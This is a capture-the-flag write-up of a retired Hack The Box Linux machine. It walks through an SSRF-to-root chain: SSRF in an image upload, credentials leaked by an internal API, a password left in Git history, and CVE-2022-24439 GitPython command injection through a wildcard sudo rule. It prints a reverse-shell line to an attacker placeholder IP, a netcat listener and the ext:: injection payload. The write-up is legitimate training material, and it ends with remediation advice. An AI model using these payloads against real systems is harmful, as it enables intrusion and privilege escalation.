---
title: "SSRF to GitPython Privilege Escalation"
description: "SSRF in a book-cover upload exposes an internal API and development credentials; Git history reveals production credentials, and a sudo-permitted GitPython script vulnerable to CVE-2022-24439 yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - ssrf
  - gitpython
  - credential-leak
---

## Summary

This Linux lab (Ubuntu 22.04) contains an SSRF vulnerability in a publishing platform's book cover upload feature that exposes an internal API service. The API leaks credentials for the `<DEVELOPMENT_USER>` user, enabling SSH access. A local Git repository in that user's home directory exposes production credentials via commit history. Privilege escalation exploits CVE-2022-24439 in GitPython through a sudo rule that permits the `<PRODUCTION_USER>` user to execute a vulnerable Python script as root.

## Context and Objective

The target runs nginx on port 80 and SSH on port 22. The web application at `http://<TARGET_HOST>` provides a book publishing platform with a cover image upload feature. The objective is to identify and exploit the SSRF vector, enumerate internal services, extract credentials, and escalate to root.

## Approach and Evidence

### Port Scanning and Service Discovery

The target exposes SSH and HTTP:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -sC -sV -Pn -oN nmap/target-TCP
```

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The web server redirects to `http://<TARGET_HOST>`. The `<UPLOAD_ENDPOINT>` endpoint accepts a book cover image URL and performs server-side fetching.

### SSRF via Book Cover Upload

The `<UPLOAD_ENDPOINT>` endpoint accepts a user-supplied `bookurl` parameter and fetches it server-side. Pointing this at the internal network reveals an API service on port 5000:

```bash
ffuf -u http://<TARGET_HOST><UPLOAD_ENDPOINT> -request ssrf.req -w <(seq 0 65535) -ac
```

```text
5000  [Status: 200]
```

### Internal API Enumeration

The SSRF response from the internal service at `http://<INTERNAL_API_HOST>:5000` exposes metadata endpoints:

```json
{
  "messages": [
    { "promotions": { "endpoint": "<PROMOTIONS_ENDPOINT>", "methods": "GET" } },
    { "new_authors": { "endpoint": "<AUTHORS_ENDPOINT>", "methods": "GET" } }
  ],
  "version": [
    { "changelog": { "endpoint": "<CHANGELOG_ENDPOINT>", "methods": "GET" } }
  ]
}
```

### Credential Leak via Internal API

The `<AUTHORS_ENDPOINT>` endpoint returns onboarding credentials. Using the SSRF to target this endpoint:

```bash
curl -X POST http://<TARGET_HOST><UPLOAD_ENDPOINT> \
  -F "bookurl=http://<INTERNAL_API_HOST>:5000<AUTHORS_ENDPOINT>" \
  -F "bookfile=@/dev/null;filename="
```

The returned JSON contains plaintext credentials for the `<DEVELOPMENT_USER>` user.

### SSH Access as Development User

The leaked credentials grant SSH access:

```bash
sshpass -p '<DEVELOPMENT_USER_PASSWORD>' ssh <DEVELOPMENT_USER>@<TARGET_HOST>
```

The `<USER_RESULT>` is available.

### Git History Credential Leak

A Git repository exists under the user's home directory at `<DEVELOPMENT_HOME>/<REPOSITORY_DIRECTORY>`. Inspecting the commit history reveals production credentials in a reverted change:

```bash
cd <DEVELOPMENT_HOME>/<REPOSITORY_DIRECTORY> && git log
```

```text
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
    change(api): switching production to development configuration
```

```bash
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

The diff shows production credentials that were downgraded in a previous commit, exposing the `<PRODUCTION_USER>` user's password.

### Lateral Movement to Production User

```bash
sshpass -p '<PRODUCTION_USER_PASSWORD>' ssh <PRODUCTION_USER>@<TARGET_HOST>
```

### Privilege Escalation via CVE-2022-24439

Sudo enumeration reveals that `<PRODUCTION_USER>` may run a Python script as root:

```bash
sudo -l
```

```text
User <PRODUCTION_USER> may run the following commands on <TARGET_HOST>:
    (root) /usr/bin/python3 <PRIVILEGED_SCRIPT_PATH> *
```

The privileged script uses GitPython's `clone_from` method with the `-c protocol.ext.allow=always` multi-option:

```python
import os, sys
from git import Repo
os.chdir('<PRIVILEGED_WORKING_DIRECTORY>')
url_to_clone = sys.argv[1]
r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

GitPython versions before 3.1.30 are vulnerable to CVE-2022-24439. The `ext::` protocol prefix permits arbitrary command execution:

```bash
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1" > /tmp/revshell.sh
nc -nlvp 9001
```

```bash
sudo /usr/bin/python3 <PRIVILEGED_SCRIPT_PATH> 'ext::sh -c bash% /tmp/revshell.sh'
```

```text
root@<TARGET_HOST>:<PRIVILEGED_WORKING_DIRECTORY>#
```

`<PRIVILEGED_RESULT>` is available.

## Challenges and Decisions

No documented obstacles or failed attempts in the source notes. The exploitation path was linear: SSRF → internal API credential leak → Git history credential leak → CVE-2022-24439 privilege escalation.

## Outcome

The machine was fully compromised through three distinct credential-leak vectors: an internal API accessible via SSRF, Git commit history exposing production credentials, and a vulnerable GitPython script with overly permissive sudo rules. All three stages were technically independent, meaning any one of them would have required remediation to prevent full compromise.

## Lessons and Recommendations

- **SSRF through image upload is a classic entry point.** The ability to read responses makes it especially dangerous because it enables internal API enumeration and data exfiltration.
- **Internal metadata APIs often leak credentials.** The `<AUTHORS_ENDPOINT>` endpoint was never intended to be reached externally but was fully accessible via SSRF. Internal services should not trust the network boundary.
- **Git history is a persistent credential store.** The production password was removed from the current working tree but survived in the commit history. Use `git filter-branch` or BFG Repo-Cleaner to purge secrets; better yet, use environment variables or secrets managers.
- **GitPython's `ext::` protocol combined with `-c protocol.ext.allow=always` is a well-documented command injection vector.** Sudo rules that allow arbitrary arguments to GitPython scripts should be avoided. Upgrade GitPython to 3.1.30 or later.
- **Restrict sudo rules to specific arguments.** The wildcard `*` in the sudo rule permitted injection via the Git URL argument.

## References

- Hack The Box retired Linux machine — [Editorial](https://app.hackthebox.com/machines/Editorial)
- CVE-2022-24439: GitPython command injection via `ext::` protocol
